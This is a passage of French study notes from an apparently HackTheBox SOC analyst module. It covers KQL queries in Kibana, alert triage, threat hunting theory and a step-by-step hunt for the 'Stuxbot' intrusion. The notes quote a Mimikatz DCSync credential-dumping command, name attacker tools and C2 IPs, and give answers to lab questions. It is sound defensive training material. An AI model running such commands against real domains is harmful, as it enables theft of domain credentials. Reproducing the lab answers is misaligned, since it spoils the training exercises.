    - Logon Type = `RemoteInteractive` → RDP.
    
    **Filtres :**
    
    - `event.code: 4624`
    - `winlog.logon.type: RemoteInteractive`
    
    **KQL pour restreindre aux service accounts** (commencent par `svc-`) :
    
    ```
    user.name: svc-*
    
    ```
    
    Table :
    
    - `user.name.keyword` → service account
    - `host.hostname.keyword` → machine cible (serveur RDP)
    - `related.ip.keyword` → IP de la machine initiatrice
    - metric Count → nombre de logons.
    
    > Question associée : récupérer l’IP dans related.ip.keyword.
    > 
    
    ### Users ajoutés / supprimés du groupe Administrators
    
    Objectif : suivre les **modifications du groupe local Administrators** depuis le **05/03/2023** jusqu’à aujourd’hui.
    
    Événements :
    
    - `4732` : ajout à un groupe local sécurisé.
    - `4733` : suppression d’un membre du groupe local sécurisé.
    
    **Filtres :**
    
    - `event.code: 4732 or 4733`
    - `group.name: "Administrators"`
    
    Table – Rows :
    
    - `user.name.keyword` → qui fait l’action
    - `winlog.event_data.MemberSid.keyword` → quel user est ajouté/retiré
    - `group.name.keyword` → quel groupe (vérifier “Administrators”)
    - `event.action.keyword` → add/remove
    - `host.name.keyword` → machine locale
    
    Metrics : `Count` sur le nombre d’événements.
    
    Puis, on restreint la **période de temps** (time picker):
    
    - From : `2023-03-05`
    - To : date actuelle (ou autre plage absolue).
    
    > Question associée : toutes les entrées retournées se produisent le même jour → donner cette date au format 20XX-0X-0X.
    > 
    
    ## Processus de triage d’alertes
    
    Le module donne une vue “idéale” du **triage d’alertes** en SOC.
    
    ### Étapes principales
    
    1. **Initial Alert Review**
        - Lire l’alerte : règle qui a matché, time, src/dst, système impacté, sévérité.
        - Regarder les logs associés dans le SIEM pour le contexte.
    2. **Classification de l’alerte**
        - Basée sur : sévérité, impact potentiel, urgence.
        - Utiliser la grille de classification interne (Low/Medium/High/Critical).
    3. **Corrélation**
        - Voir s’il y a d’autres alertes ou événements liés (même IP, même host, même user).
        - Chercher dans le SIEM d’autres événements autour du même moment.
        - S’appuyer sur la **threat intel** pour IP/domain/process suspects.
    4. **Enrichissement**
        - Récupérer des infos supplémentaires : PCAP, dumps, fichiers suspects…
        - Analyser fichiers/URLs/IPs (sandbox, VT, outils internes).
        - Vérifier process, connexions réseau, fichiers modifiés sur la machine impactée.
    5. **Risk Assessment**
        - Quelle est la criticité du système impacté ?
        - Données sensibles / contraintes réglementaires ?
        - Risque de **lateral movement** ?
    6. **Contextual Analysis**
        - Comprendre le contexte métier : est-ce une activité normale ?
        - Regarder les protections déjà en place (FW, EDR, IDS…) et s’il y a contournement.
        - Intégrer les contraintes **compliance** (ex : impact GDPR).
    7. **Incident Response Planning**
        - Si l’alerte est réelle et significative → déclencher le plan IR.
        - Documenter : systèmes, IOCs, comportements observés.
        - Assigner des rôles, coordonner avec les autres équipes (ops, admins, réseau).
    8. **Consultation avec IT Operations**
        - Vérifier s’il y a eu des changes/maintenance qui expliquent l’alerte.
        - Identifier les misconfigurations ou activités légitimes qui ressemblent à de l’attaque.
    9. **Response Execution**
        - Si faux positif → documenter et éventuellement tuner la règle.
        - Si vrai positif → containment, éradication, récupération.
    10. **Escalade**
        - Triggers : systèmes critiques compromis, attaque active, technique inconnue, large impact, suspicion d’insider, etc.
        - Escalader vers management, IR dirigeants, voire entités externes (CERT, police) si requis.
    11. **Continuous Monitoring**
        - Suivre l’incident, fournir des updates, vérifier pas de ré-apparition.
    12. **De-escalation & Lessons learned**
        - Quand le risque est maîtrisé, clore/abaisser la priorité.
        - Faire un **retour d’expérience** (post-mortem) et mettre à jour règles/procédures.
    
    ## Ce que j’ai appris / à retenir pour la pratique SOC
    
    - Un **SIEM**, ce n’est pas juste un “super syslog” :
        - c’est un outil de **corrélation**, de **détection avancée** et de **compliance**.
    - L’**Elastic Stack** est un SIEM open-source très puissant :
        - Elasticsearch pour la recherche,
        - Logstash pour les pipelines,
        - Kibana pour la visualisation,
        - Beats pour la collecte.
    - **KQL** est indispensable pour un analyste SOC :
        - filtres sur `event.code`, `user.name`, `winlog.event_data.*`, `@timestamp`, etc.
        - wildcards (`admin*`, `svc-*`), comparaisons et combinaisons logiques.
    - L’**ECS** permet d’unifier les logs et d’écrire des règles portables entre sources.
    - Le SOC moderne (SOC 2.0 et +) doit être **proactif**, pas seulement réactif :
        - threat hunting, intelligence, préparation pré-incident, forensics post-incident.
    - **MITRE ATT&CK** est un langage commun pour décrire et couvrir les TTP adverses :
        - utile pour écrire des use cases, faire du gap analysis et guider les red team.
    - Un bon **SIEM use case** passe toujours par :
        - des requirements clairs,
        - une bonne compréhension des **data points**,
        - une validation des logs,
        - un SOP documenté,
        - du fine-tuning continu.
    - Les exemples **MSBuild / LoLBins** montrent comment transformer une “connaissance offensive” en règle de détection structurée (avec mapping MITRE, sévérité, TTD/TTR…).
    - Les visualisations Kibana (failed logons, disabled accounts, RDP service accounts, admins group modifications) sont des **cas très réalistes** qu’on retrouve en entreprise.
    - Le **triage d’alertes** est un vrai processus méthodique, pas juste “regarder les logs” :
        - classification, corrélation, enrichissement, risk assessment, escalade, IR.

## **Introduction to Threat Hunting & Hunting With Elastic**

## Threat Hunting Fundamentals

![cti.png](cti.png)

### Définition & objectifs

- Le **dwell time** (temps entre compromission et détection) se compte souvent en **semaines** voire en **mois**.
- Le modèle purement **réactif** (attendre les alertes / signatures / AV) n’est plus suffisant.
- Le **threat hunting** = activité **humaine**, **proactive**, souvent **guidée par des hypothèses**, qui consiste à fouiller les données (logs, flux réseau, endpoints…) pour trouver :
    - des **menaces avancées**,
    - qui **échappent** aux détections automatiques.

Usage :

- **Proactif** : on part d’une hypothèse, de TTPs ou de nouvelle CTI.
- **Réactif** : on investigue **plus loin** suite à un incident ou une alerte confirmée.

> Le module insiste bien : le threat hunting est utilisé proactivement et réactivement.
> 

### Lien avec l’Incident Handling

Le threat hunting s’insère dans les phases classiques de gestion d’incident :

1. **Preparation**
    - Définir les **règles d’engagement**, responsabilités, périmètre.
    - Intégrer le hunting dans les **processus IR existants** (politiques, procédures).
2. **Detection & Analysis**
    - Le hunter aide à confirmer si des IoCs = vrai incident ou faux positif.
    - Il cherche des **artéfacts supplémentaires** et d’éventuelles compromissions cachées.
3. **Containment / Eradication / Recovery**
    - Selon l’orga, les hunters peuvent **participer** à ces étapes (pas systématique, dépend des procédures internes).
4. **Post-Incident Activity**
    - Les hunters apportent leur vision globale IT / sécurité pour :
        - recommander des améliorations,
        - renforcer la posture globale.

Conclusion : **Incident handling** et **threat hunting** peuvent être **intégrés** ou séparés, mais **pas “toujours indépendants”**.

### Quand chasser ?

Moments clés où lancer une chasse :

- **Nouvelle vulnérabilité / nouvel acteur** ciblant nos technos.
- **Nouveaux IoCs** associés à un adversaire qui vise notre secteur.
- **Multiples anomalies réseau** ou événements corrélés suspects.
- **Pendant un incident IR** : pour cartographier toute l’étendue de la compromission.
- **De façon périodique** : hunting **proactif régulier**.

> Idée centrale : le meilleur moment pour chasser, c’est maintenant – ne pas attendre une alerte.
> 

### Structure d’une équipe de threat hunting

Rôles typiques :

- **Threat Hunter** : mène la chasse, connaît TTPs, kill chain, outils de hunting.
- **Threat Intelligence Analyst** : collecte & analyse CTI (OSINT, dark web, feeds…).
- **Incident Responders** : prennent le relais pour containment / eradication / recovery.
- **Forensic Experts (DFIR)** : reverse malware, analyse artefacts, rapports poussés.
- **Data Analysts / Data Scientists** : modèles, ML, stats sur gros volumes de logs.
- **Security Engineers / Architects** : design infra, intègrent les outils de hunting & défenses.
- **Network Security Analyst** : compréhension fine des flux & comportements réseau.
- **SOC Manager** : coordination, reporting, priorisation des efforts.

## Threat Hunting Process

Le module décrit un cycle de chasse générique :

1. **Setting the Stage (Préparation)**
    - Comprendre le **contexte métier**, les **actifs critiques** (crown jewels).
    - S’assurer que :
        - les **logs sont activés** (Sysmon, PowerShell, Zeek, etc.),
        - les outils (SIEM, EDR, IDS) sont bien configurés.
    - Se tenir à jour de la **CTI** et des profils d’attaquants.
2. **Formulating Hypotheses**
    - Formuler des hypothèses **testables**, basées sur :
        - CTI récente,
        - alertes existantes,
        - intuition / expérience.
    - Exemple : *« Un APT exploite une vulnérabilité web pour établir un C2 »*.
3. **Designing the Hunt**
    - Choisir :
        - les **sources de données** (logs web, DNS, PowerShell, endpoints…),
        - les **outils** (KQL, scripts, frameworks),
        - les **IoCs / patterns** à rechercher.
    - Écrire des **queries** et scripts de hunting.
4. **Data Gathering & Examination**
    - Collecter / filtrer / corréler les événements.
    - Itérer :
        - on raffine l’hypothèse ou la zone de recherche au fur et à mesure.
5. **Evaluating Findings & Testing Hypotheses**
    - Confirmer ou infirmer l’hypothèse.
    - Identifier les systèmes impactés, le niveau de compromission, le risque.
6. **Mitigating Threats**
    - Si menace confirmée :
        - isoler les machines,
        - supprimer malwares / backdoors,
        - patch / durcissement,
        - ajuster règles (FW, EDR, SIEM…).
7. **After the Hunt**
    - Documenter :
        - ce qui a été fait, trouvé, appris.
    - Mettre à jour :
        - règles de détection,
        - playbooks IR,
        - CTI interne.
8. **Continuous Learning**
    - Chaque chasse alimente la suivante :
        - nouveaux TTPs,
        - nouveaux dashboards / requêtes réutilisables.

> Point clé : les hypothèses doivent être testables → répondre “ False ” à “It is OK to formulate hypotheses that are not testable”.
> 

## Threat Hunting Glossary & Threat Intel

### Quelques définitions clés

- **Adversary** : acteur malveillant (cybercriminel, insider, hacktiviste, APT…).
- **APT** : groupe disposant de moyens importants, objectif long terme, persistance élevée (mais pas forcément “techniquement ultra avancé”).
- **TTPs (Tactics, Techniques, Procedures)** :
    - **Tactics** : *pourquoi* (objectif haut niveau).
    - **Techniques** : *comment* (méthodes).
    - **Procedures** : *recette détaillée* (commandes, scripts…).
- **Indicator** = **donnée technique + contexte** → sans contexte, un IP ou un hash brut a peu de valeur.
- **Threat** = combinaison de :
    - **Intent** (motivation),
    - **Capability** (moyens / skills),
    - **Opportunity** (surface d’attaque exposée).
- **Campaign** : ensemble d’incidents partageant mêmes TTPs / objectifs.

### Pyramid of Pain

Hiérarchie des indicateurs (du plus facile au plus dur à changer pour l’attaquant) :

1. **Hash values** – trivial à changer.
2. **IP addresses** – facile (VPN, proxies, TOR…).
3. **Domain names** – DGAs, DNS dynamique, etc.
4. **Network / Host Artifacts** – plus durs à modifier sans casser l’attaque.
5. **Tools** – changer de framework / malware coûte plus cher.
6. **TTPs** – sommet de la pyramide : forcer un groupe à changer ses TTP a un **coût énorme** pour lui.

Idée : viser le plus haut possible dans la pyramide pour augmenter le **“pain”** côté attaquant.

### Diamond Model

4 sommets :

- **Adversary**
- **Capability** (outils, TTPs)
- **Infrastructure** (serveurs, domaines, IP)
- **Victim**

On étudie les relations entre ces 4 éléments pour mieux comprendre et prédire les intrusions.

### Cyber Threat Intelligence (CTI)

4 critères pour une CTI utile :

1. **Relevance** – pertinent pour **notre** orga.
2. **Timeliness** – information **fraîche**.
3. **Actionability** – qui mène à une **action concrète** (règle, blocage, hunt…).
4. **Accuracy** – vérifiée / sourcée ; sinon marquée avec un **niveau de confiance**.

CTI ≠ “balance un IP tout seul au SOC” :

- Un **IP sans contexte**, c’est **inutile** (donc répondre “False” à *“It’s useful for the CTI team to provide a single IP with no context to the SOC team”*).

3 niveaux de CTI :

- **Stratégique** : pour direction / C-level (Who? Why? vision long terme).
- **Opérationnelle** : campagnes, TTPs, “How? Where?”.
- **Tactique** : IoCs concrets (hash, IP, domaines, chemins…).

### CTI vs Threat Hunting

- **Threat Intelligence (prévisionnel)** :
    - Prédit où/qui/quand/comment l’adversaire va attaquer.
- **Threat Hunting (réactif + proactif)** :
    - Part d’un incident / d’une info pour vérifier s’il y a présence de l’adversaire dans le SI.

Les deux se nourrissent mutuellement :

- La CTI guide les hypothèses de hunting.
- Le hunting enrichit la CTI avec de nouveaux IoCs / TTPs.

## Cas pratique : Hunting for Stuxbot avec Elastic Stack

### Environnement

- SIEM : **Elastic Stack / Kibana**
- Index :
    - `windows*` : logs Windows + Sysmon + PowerShell.
    - `zeek*` : logs réseau (DNS, connexions…).
- Contexte :
    - Petite boîte (~200 users), usage surtout bureautique, Gmail via navigateur, Edge par défaut.

### Hypothèse initiale

À partir du rapport CTI Stuxbot :

- Initial access → **phishing** avec un faux fichier **OneNote “invoice.one”**.
- L’idée : vérifier si un tel fichier apparaît dans l’environnement et remonter toute la chaîne d’attaque.

### 4.2.1. Détection du téléchargement `invoice.one`

KQL :

```
event.code:15 AND file.name:*invoice.one

```

- `event.code:15` = **Sysmon Event ID 15** (*FileCreateStreamHash*, souvent lié aux téléchargements via navigateur).
- On trouve :
    - fichier `invoice.one`,
    - téléchargé par **MSEdge**,
    - sur la machine **WS001**,
    - utilisateur **Bob**,
    - à la date clé (26/03/2023 vers 22:05:47).

Confirmation via création de fichier :

```
event.code:11 AND file.name:invoice.one*

```

(`event.code:11` = Sysmon **FileCreate**)

### Pivot réseau : Zeek DNS & connexions

On connaît l’IP de WS001 (ex : `192.168.28.130`).

DNS vus par Zeek :

```
source.ip:192.168.28.130 AND dns.question.name:*

```

On filtre le bruit (Google, analytics, etc.) et on se concentre :

- Accès à **mail.google.com**,
- Puis à un site de **file hosting** (`file.io`),
- Puis requêtes vers `nav-edge.smartscreen.microsoft.com` (Defender SmartScreen, typique après download).

En regardant les IPs résolues (`dns.answers.data`), on retrouve les IPs du hosting, puis on cherche les connexions TCP vers ces IPs pendant la même fenêtre temporelle → confirmation que **Bob a bien téléchargé `invoice.one` depuis un file hosting**.

### Ouverture du OneNote & exécution du batch

On veut maintenant voir ce qui s’est passé après ouverture de `invoice.one`.

### Ouverture du fichier OneNote

```
event.code:1 AND process.command_line:*invoice.one*

```

- `event.code:1` = **Sysmon Process Create**.
- On voit **ONENOTE.EXE** lancer ce fichier ~6 s après le download.

### Processus enfants de OneNote

```
event.code:1 AND process.parent.name:"ONENOTE.EXE"

```

On obtient :

- Un process **OneNoteM.exe** (composant légitime),
- Un **cmd.exe** qui exécute un batch **`invoice.bat`** depuis un répertoire temporaire (attachement intégré dans la page OneNote).

### PowerShell dropper depuis Pastebin

On cherche maintenant ce que fait `invoice.bat` :

```
event.code:1 AND process.parent.command_line:*invoice.bat*

```

Résultat :

- Lancement de **PowerShell** avec une ligne de commande suspicieuse qui :
    - télécharge un script depuis **Pastebin**,
    - l’exécute en mémoire.

On récupère le `process.pid` de ce PowerShell (par ex. 9944) et on filtre toutes ses activités :

```
process.pid:"9944" AND process.name:"powershell.exe"

```

On voit :

- Création de plusieurs fichiers temporaires :
    - `default.exe`,
    - `DomainPasswordSpray.ps1`, etc. ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))
- Résolutions de domaine vers **ngrok.io** (C2 masqué),
- Connexions HTTPS aux IPs associées.

L’attaquant a donc :

1. Utilisé un batch pour lancer PowerShell.
2. Téléchargé un **stager** depuis Pastebin.
3. Déposé un binaire **`default.exe`** pour la suite de l’attaque.
4. Déployé un script de **password spraying**.

### Analyse de `default.exe`

On inspecte tous les événements liés à `default.exe` :

```
process.name:"default.exe"

```

Constats :

- `default.exe` est en réalité un **ApacheBench** renommé (`ab.exe`), utilisé ici comme **outil de charge / tunneling C2**. ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))
- Il crée plusieurs fichiers :
    - `C:\Users\bob\AppData\Local\Temp\svchost.exe`
    - `C:\Users\Public\SharpHound.exe`
    - `C:\Users\bob\AppData\Local\Temp\PsExec64.exe`
    - `C:\Users\svc-sql1\AppData\Local\Temp\XceGuhkzaTrOy.vbs`
    - `C:\Users\Public\payload.exe` ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))
- Il génère aussi des connexions régulières vers les IP C2 `18.158.249.75` puis `3.125.102.39` (via **ngrok**). ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))

> Réponse Stuxbot Q1 : le fichier VBS mentionné pendant l’analyse de default.exe est
> 
> 
> **`XceGuhkzaTrOy.vbs`**. ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))
> 

Par ailleurs, le hash SHA-256 de `default.exe` correspond à l’un de ceux du rapport CTI Stuxbot, et on le retrouve sur **WS001** et **PKI** (serveur de certificats). ([faresbltagy.gitbook.io](https://faresbltagy.gitbook.io/footprintinglabs/soc-hackthebox-notes-and-labs/introduction-to-threat-hunting-and-hunting-with-elastic-module?utm_source=chatgpt.com))

### Recon AD & privilèges

- Le fichier **`SharpHound.exe`** est déposé dans `C:\Users\Public\`.
- En cherchant son exécution :

```
process.name:"SharpHound.exe"

```

On voit qu’il a été lancé (deux fois) avec des arguments de collecte (ex. `-collectionmethod all`). ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))

→ L’attaquant réalise un **recon AD** (cartographie des chemins d’escalade).

### Lateral movement & compromission du compte `svc-sql1`

Recherche globale sur le hash SHA-256 de `default.exe` :

```
process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4

```

On retrouve :

- Exécution de `default.exe` sur **WS001** et **PKI**.
- Sur **PKI** :
    - Parent process : **PSEXESVC** (PSExec signé Microsoft),
    - `user.name` : **EAGLE\svc-sql1**. ([blog.salucci.ch](https://blog.salucci.ch/docs/HackingLab/HackTheBox/SOC-Analyst/Hunting-For-Stuxbot/?utm_source=chatgpt.com))

On lance alors un hunt sur les logons réseau (type 3) depuis WS001 :

```
(event.code:4624 OR event.code:4625)
AND winlog.event_data.LogonType:3
AND source.ip:192.168.28.130

```

On observe : ([faresbltagy.gitbook.io](https://faresbltagy.gitbook.io/footprintinglabs/soc-hackthebox-notes-and-labs/introduction-to-threat-hunting-and-hunting-with-elastic-module?utm_source=chatgpt.com))

- Quelques échecs pour `administrator` sur DC1,
- Puis, plus tard, **de nombreux logons réussis** pour `svc-sql1` (sur PKI et d’autres hôtes).

Conclusion :

- Le script **DomainPasswordSpray.ps1** a permis de **bruteforcer le compte `svc-sql1`**,
- PSExec est utilisé pour **propager `default.exe`** sur PKI,
- `svc-sql1` devient le **pivot principal**.

### Mimikatz & dcsync

On recherche `mimikatz.exe` :

```
event.code:1 AND process.name:"mimikatz.exe"

```

Dans `process.args`, on trouve : ([Medium](https://medium.com/%40devanshichavda98/hackthebox-hunting-for-stuxbot-a-real-world-threat-hunt-with-elastic-ab675a6e764d?utm_source=chatgpt.com))

> lsadump::dcsync /domain:eagle.local /all /csv, exit
> 

→ L’attaquant lance un **DCSync** (dump des secrets AD via réplication) → quasiment **full domain compromise**.

> Réponse Stuxbot Q2 : lsadump::dcsync /domain:eagle.local /all /csv, exit
> 

### Code PowerShell en mémoire → PowerView

Dernière question : un code PowerShell en mémoire scanne les **partages réseau**. On doit identifier de quel outil il provient.

Stratégie :

1. Chercher les événements PowerShell avec contenu de script :
    
    ```
    powershell.file.script_block_text: *mimikatz*
    
    ```
    
    (ou plus large : `powershell.file.script_block_text:*` puis filtrer).
    
2. Lire le script contenu dans `powershell.file.script_block_text` :
    - On y retrouve des fonctions typiques de **PowerView** (énumération des partages, domaines, ACL, etc.). ([Medium](https://medium.com/%40devanshichavda98/hackthebox-hunting-for-stuxbot-a-real-world-threat-hunt-with-elastic-ab675a6e764d?utm_source=chatgpt.com))

> Réponse Stuxbot Q3 : PowerView
> 

## Skills Assessment – Hunting For Stuxbot (Round 2)

Nouvelle itération de Stuxbot, nouvelles TTPs :

1. Dépôt d’outils dans `C:\Users\Public`.
2. Persistance via **registry Run keys**.
3. Lateral movement via **PowerShell Remoting** vers les DC.

### Hunt 1 – Lateral Tool Transfer vers `C:\Users\Public`

Objectif : trouver l’utilisateur lié à un outil copié dans `C:\Users\Public` dont le nom commence par **“r”**.

Exemple de KQL possible : ([janprats.com](https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com))

```
event.code:11 AND message:"C:\\Users\\Public*" AND file.name:R*

```

En filtrant et en examinant l’événement où un outil type `Rubeus.exe` est transféré, on regarde le champ **`user.name`** :

### Hunt 2 – Registry Run Keys / Startup Folder

Objectif : trouver la **première** persistance par clé de registre (Run key) et donner la valeur de `registry.value`.

Approche (ID Sysmon 13 pour les modifications de registre) : ([janprats.com](https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com))

```
event.code:13 AND registry.path:*\\Run\\*

```

En triant par temps et en regardant la **première** entrée de persistance (créée par `powershell.exe`), on trouve une valeur “aléatoire” :

### Hunt 3 – PowerShell Remoting vers DC1

Objectif : identifier l’utilisateur (`winlog.user.name`) utilisé pour du **PowerShell Remoting** vers **DC1**.

On peut utiliser les logs de Script Block (event 4104) : ([janprats.com](https://janprats.com/blog/tech_stack/elastic_threathunting.html?utm_source=chatgpt.com))

```
event.code:4104 AND message:"DC1"

```